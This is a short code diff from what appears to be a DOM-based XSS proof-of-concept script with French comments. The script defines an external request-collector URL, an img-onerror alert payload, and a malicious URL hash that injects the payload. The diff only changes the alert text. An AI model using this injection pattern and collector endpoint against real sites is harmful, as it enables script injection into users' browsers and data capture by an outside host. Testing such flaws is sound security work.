@@ -12,7 +12,7 @@
     const requestBinURL = "https://eo2uyqmp09oup0u.m.pipedream.net";
 
     // Définir le payload XSS
-    const xssPayload = "<img src='x' onerror='alert(\"XSS works!\")'>";
+    const xssPayload = "<img src='x' onerror='alert(\"XSS workos!\")'>";
     
     // Ajouter le payload dans le hash de l'URL
     const maliciousHash = "#<div id='output'>" + xssPayload + "</div>";
